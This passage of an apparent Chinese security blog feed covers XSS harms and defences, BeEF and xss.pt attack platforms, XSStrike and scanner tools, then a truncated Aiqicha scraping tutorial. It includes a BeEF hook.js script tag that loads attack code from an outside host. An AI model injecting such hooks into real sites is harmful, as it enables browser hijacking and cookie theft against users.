title="5.XSS危害与防御"></a>5.XSS危害与防御</h2><p>XSS危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盗取cookie</span><br><span class="line"></span><br><span class="line">植入键盘记录器。</span><br><span class="line"></span><br><span class="line">攻击受害者所在的局域网。</span><br><span class="line"></span><br><span class="line">代理转发流经被攻击者的所有 Web 流量，即实施中间人攻击。</span><br><span class="line"></span><br><span class="line">窃取或篡改应用 cookie 用于会话劫持。</span><br><span class="line"></span><br><span class="line">更改被攻击者 Web 应用的显示内容。</span><br><span class="line"></span><br><span class="line">绕过 CSRF 安全防护措施。</span><br><span class="line"></span><br><span class="line">创建包含恶意 JavaScript 代码的虚假网站以及到该网站页面的链接。</span><br><span class="line"></span><br><span class="line">发送嵌入恶意 Web URL 的电子邮件。</span><br><span class="line"></span><br><span class="line">使用 URL 短码隐蔽真实 URL。</span><br></pre></td></tr></table></figure><p>XSS防御</p><p><a href="https://zhuanlan.zhihu.com/p/262038810">https://zhuanlan.zhihu.com/p/262038810</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html回显内容在html页面标签之外时，实体化左右尖括号</span><br><span class="line">html回显内容在&lt;script&gt;代码快时，实体化左右尖括号、“/”、单引号等可能闭合标签的字符</span><br><span class="line">html回显内容通过postmessage作为输入点时 检测messageEvent的来源是否在白名单内，同时检测来源数据是否合法，是否存在恶意代码</span><br></pre></td></tr></table></figure><h2 id="6-XSS平台"><a href="#6-XSS平台" class="headerlink" title="6.XSS平台"></a>6.XSS平台</h2><h3 id="1-beef-xsss"><a href="#1-beef-xsss" class="headerlink" title="1.beef-xsss"></a>1.beef-xsss</h3><h4 id="1-安装登录"><a href="#1-安装登录" class="headerlink" title="1.安装登录"></a>1.安装登录</h4><p>安装beef-xss</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">beef-xss 之后默认走流程</span><br><span class="line"></span><br><span class="line">beef-xss打开</span><br><span class="line">在<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>/ui/authentication登录</span><br></pre></td></tr></table></figure><p>默认用户名beef 密码pass</p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><p>src 连接到本地beef-xss</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.89.129:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>运行后beef-xss上线<br>找到对方的前端代码，然后插入自己的js攻击代码<br>Current Browser → Commands 可以运行多种命令</p><h3 id="2-xss-pt"><a href="#2-xss-pt" class="headerlink" title="2.xss.pt"></a>2.xss.pt</h3><p><a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p><p>创建项目</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101339963.png" alt="img"></p><p>选择相应模式后会返回payload</p><p>![image-20230710134207726](E:\网络安全\Xrect1fy’s note\assets\image-20230710134207726.png)</p><p>将payload运行</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101345101.png" alt="img"></p><h2 id="7-常用工具推荐"><a href="#7-常用工具推荐" class="headerlink" title="7.常用工具推荐"></a>7.常用工具推荐</h2><h3 id="1-XSStrike"><a href="#1-XSStrike" class="headerlink" title="1.XSStrike"></a>1.XSStrike</h3><p>项目地址:<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python xsstrike.<span class="property">py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">usage</span>: xsstrike.<span class="property">py</span> [-h] [-u <span class="variable constant_">TARGET</span>] [--data <span class="variable constant_">DATA</span>] [-t <span class="variable constant_">THREADS</span>] [--seeds <span class="variable constant_">SEEDS</span>] [--json] [--path]</span><br><span class="line">                   [--fuzzer] [--update] [--timeout] [--params] [--crawl] [--blind]</span><br><span class="line">                   [--skip-dom] [--headers] [--proxy] [-d <span class="variable constant_">DELAY</span>] [-e <span class="variable constant_">ENCODING</span>]</span><br><span class="line"> </span><br><span class="line">optional <span class="attr">arguments</span>:</span><br><span class="line">  -h, --help            show <span class="variable language_">this</span> help message and exit</span><br><span class="line">  -u, --url             target url</span><br><span class="line">  --data                post data</span><br><span class="line">  -f, --file            load payloads <span class="keyword">from</span> a file</span><br><span class="line">  -t, --threads         number <span class="keyword">of</span> threads</span><br><span class="line">  -l, --level           level <span class="keyword">of</span> crawling</span><br><span class="line">  -t, --encode          payload encoding</span><br><span class="line">  --json                treat post data <span class="keyword">as</span> json</span><br><span class="line">  --path                inject payloads <span class="keyword">in</span> the path</span><br><span class="line">  --seeds               load urls <span class="keyword">from</span> a file <span class="keyword">as</span> seeds</span><br><span class="line">  --fuzzer              fuzzer</span><br><span class="line">  --update              update</span><br><span class="line">  --timeout             timeout</span><br><span class="line">  --params              find params</span><br><span class="line">  --crawl               crawl</span><br><span class="line">  --proxy               use <span class="title function_">prox</span>(y|ies)</span><br><span class="line">  --blind               inject blind xss payloads <span class="keyword">while</span> crawling</span><br><span class="line">  --skip                skip confirmation dialogue and poc</span><br><span class="line">  --skip-dom            skip dom checking</span><br><span class="line">  --headers             add headers</span><br><span class="line">  -d, --delay           delay between requests</span><br></pre></td></tr></table></figure><h3 id="2-XSSpayload"><a href="#2-XSSpayload" class="headerlink" title="2.XSSpayload"></a>2.XSSpayload</h3><p>一种xss fuzz爆破方式</p><p><a href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload</a></p><p>放入payload看弹窗数字确定payload行数。</p><h3 id="3-Burpsuite-XSS-Validator插件"><a href="#3-Burpsuite-XSS-Validator插件" class="headerlink" title="3.Burpsuite XSS Validator插件"></a>3.Burpsuite XSS Validator插件</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p>1.phantomjs下载</p><p><a href="http://phantomjs.org/download.html">http://phantomjs.org/download.html</a></p><p>将phantomjs所在的bin目录添加到环境变量</p><p>下载xss.js,将其放到和phantomjs.exe一个目录中</p><p><a href="https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js">https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js</a></p><p>运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phantomjs.exe xss.js</span><br></pre></td></tr></table></figure><p>2.安装插件</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101352302.png" alt="img"></p><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><p>1.用bp抓包send to intruder</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101428475.png"></p><p>2.配置变量</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101430632.png"></p><p>3.配置GREP-MATCH</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101433439.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101434106.png"></p><p>4.启动扫描</p><p>参考文章:</p><p><a href="https://www.freesion.com/article/77561513173/">burpsuite插件xssValidator的安装及使用（XSS自动扫描工具）</a></p><h3 id="4-payload大全"><a href="#4-payload大全" class="headerlink" title="4.payload大全"></a>4.payload大全</h3><p><a href="https://www.cnblogs.com/xiaozi/p/7268506.html">XSSpayload大全</a></p><h2 id="8-参考文章"><a href="#8-参考文章" class="headerlink" title="8.参考文章"></a>8.参考文章</h2><p><a href="https://wiki.sheep0818.xyz/doc/151/">XSS CSRF SSRF</a></p><p><a href="https://www.52dianzi.com/category/article/37/625025.html">Xss Bypass备忘录</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫实战-爬取爱企查企业数据</title>
      <link href="/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>​爱企查是百度推出的企业信息查询工具，可快速查询企业相关信息。在平时测试时，测试人员需要收集大量的企业信息，可以借助爬虫爬取爱企查网站实现。</p><p>​在挖通用型CNVD时 ，一般需要满足企业注册资金在5000w以上，本文演示爬取满足注册资金在5000w以上的企业信息。</p><h1 id="2-分析思路"><a href="#2-分析思路" class="headerlink" title="2.分析思路"></a>2.分析思路</h1><p>1.登录爱企查，筛选企业类型为</p><ul><li>注册资金在5000万以上</li><li>资本类型为人民币</li><li>企业状态为开业</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011543018.png"></a></p><p>2.进入网站后尝试从源码中取出广州市荔湾区华强电动设备行越秀分行</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544160.png" alt="image.png"></p><p>发现查询失败：<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544919.png" alt="image.png"></p><p>尝试f12抓包看请求<br>发现包内容过多。</p><p>3.选择去爬企业名称和注册资本</p><p>点击下方的页面索引：<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011545837.png" alt="image.png"></p><p>查看抓到的包的访问payload<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546571.png" alt="image.png"></p><p>尝试多访问几页<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546613.png" alt="image.png"><br>发现payload基本一致<br>p:代表页数<br>f:代表筛选的数据信息</p><p>4.查看Response包（部分)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;qType&quot;</span><span class="punctuation">:</span> <span class="number">111</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;queryStr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;pageNum&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;resultList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91770835364651&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6709\u9650\u8d23\u4efb\u516c\u53f8(\u81ea\u7136\u4eba\u6295\u8d44\u6216\u63a7\u80a1)&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;validityFrom&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018-08-22&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;domicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entLogo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;openStatus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;legalPerson&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;logoWord&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u4e49\u94ed\u5efa\u7b51&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;hkLable&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isHkComp&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isClaim&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleLegal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleDomicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regCap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1,011,000,000.0\u4e07&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u8bb8\u53ef\u9879\u76ee\uff1a\u623f\u5c4b\u5efa\u7b51\u548c\u5e02\u653f\u57fa\u7840\u8bbe\u65bd\u9879\u76ee\u5de5\u7a0b\u603b\u627f\u5305\uff1b\u5404\u7c7b\u5de5\u7a0b\u5efa\u8bbe\u6d3b\u52a8\uff1b\u7535\u6c14\u5b89\u88c5\u670d\u52a1\uff1b\u5efa\u7b51\u52b3\u52a1\u5206\u5305\uff1b\u4eba\u9632\u5de5\u7a0b\u9632\u62a4\u8bbe\u5907\u5236\u9020(\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\uff0c\u7ecf\u76f8\u5173\u90e8\u95e8\u6279\u51c6\u540e\u65b9\u53ef\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8\uff0c\u5177\u4f53\u7ecf\u8425\u9879\u76ee\u4ee5\u5ba1\u6279\u7ed3\u679c\u4e3a\u51c6)\u3002\u4e00\u822c\u9879\u76ee\uff1a\u5de5\u7a0b\u7ba1\u7406\u670d\u52a1\uff1b\u4f4f\u5b85\u6c34\u7535\u5b89\u88c5\u7ef4\u62a4\u670d\u52a1\uff1b\u516c\u8def\u6c34\u8fd0\u5de5\u7a0b\u8bd5\u9a8c\u68c0\u6d4b\u670d\u52a1\uff1b\u8f68\u9053\u4ea4\u901a\u4e13\u7528\u8bbe\u5907\u3001\u5173\u952e\u7cfb\u7edf\u53ca\u90e8\u4ef6\u9500\u552e\uff1b\u627f\u63a5\u603b\u516c\u53f8\u5de5\u7a0b\u5efa\u8bbe\u4e1a\u52a1\uff1b\u571f\u77f3\u65b9\u5de5\u7a0b\u65bd\u5de5\uff1b\u56ed\u6797\u7eff\u5316\u5de5\u7a0b\u65bd\u5de5\uff1b\u57ce\u5e02\u7eff\u5316\u7ba1\u7406\uff1b\u82b1\u5349\u7eff\u690d\u79df\u501f\u4e0e\u4ee3\u7ba1\u7406\uff1b\u9632\u8150\u6750\u6599\u9500\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u96f6\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u6279\u53d1\uff1b\u91d1\u5c5e\u6750\u6599\u9500\u552e\uff1b\u5efa\u7b51\u6750\u6599\u9500\u552e\uff1b\u6d82\u6599\u5236\u9020\uff08\u4e0d\u542b\u5371\u9669\u5316\u5b66\u54c1\uff09\uff1b\u91d1\u5c5e\u7ed3\u6784\u9500\u552e\uff1b\u5efa\u7b51\u7528\u94a2\u7b4b\u4ea7\u54c1\u9500\u552e\uff1b\u91d1\u5c5e\u7ed3\u6784\u5236\u9020(\u9664\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\u5916\uff0c\u51ed\u8425\u4e1a\u6267\u7167\u4f9d\u6cd5\u81ea\u4e3b\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8)\u3002&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91320322MA1X36PF3D&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;appJumpUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aiqicha:\/\/open.app?params=&#123;\&quot;naModule\&quot;:\&quot;\/aqc\/detail\&quot;,\&quot;naParam\&quot;:\&quot;&#123;\\\&quot;pid\\\&quot;:\\\&quot;91770835364651\\\&quot;&#125;\&quot;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;opening&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personTitle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6cd5\u5b9a\u4ee3\u8868\u4eba&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0fa179597fa8aaccf6f6ae44062f8a24&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;newLabels&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;opening&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>选取部分字段如<br>“entName”: “\u946b\u6e90\u9e3f\u660a(\u5929\u6d25)\u79d1\u6280\u6709\u9650\u516c\u53f8”,<br>“regCap”: “1,011,000,000.0\u4e07”,</p><p>进行解密:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011547330.png" alt="image.png"></p><p>发现解密结果对应了页面所要抓取的信息<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011548084.png" alt="image.png"></p><h1 id="3-程序编写"><a href="#3-程序编写" class="headerlink" title="3.程序编写"></a>3.程序编写</h1><p>1.保存访问请求头:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept:</span><br><span class="line">application/json, text/plain, */*</span><br><span class="line">Accept-Encoding:</span><br><span class="line">gzip, deflate, br</span><br><span class="line">Accept-Language:</span><br><span class="line">zh-CN,zh;q=0.9</span><br><span class="line">Connection:</span><br><span class="line">keep-alive</span><br><span class="line">Cookie: “抓到的cookie”</span><br><span class="line">Host:</span><br><span class="line">aiqicha.baidu.com</span><br><span class="line">Referer:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br><span class="line">Sec-Ch-Ua:</span><br><span class="line">&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile:</span><br><span class="line">?0</span><br><span class="line">Sec-Ch-Ua-Platform:</span><br><span class="line">&quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Dest:</span><br><span class="line">empty</span><br><span class="line">Sec-Fetch-Mode:</span><br><span class="line">cors</span><br><span class="line">Sec-Fetch-Site:</span><br><span class="line">same-origin</span><br><span class="line">User-Agent:</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With:</span><br><span class="line">XMLHttpRequest</span><br><span class="line">Ymg_ssr:</span><br><span class="line">1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre</span><br><span class="line">Zx-Open-Url:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br></pre></td></tr></table></figure><p>爬取代码前根据请求头制作headers</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.构造params参数如图所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.爬虫实现代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span 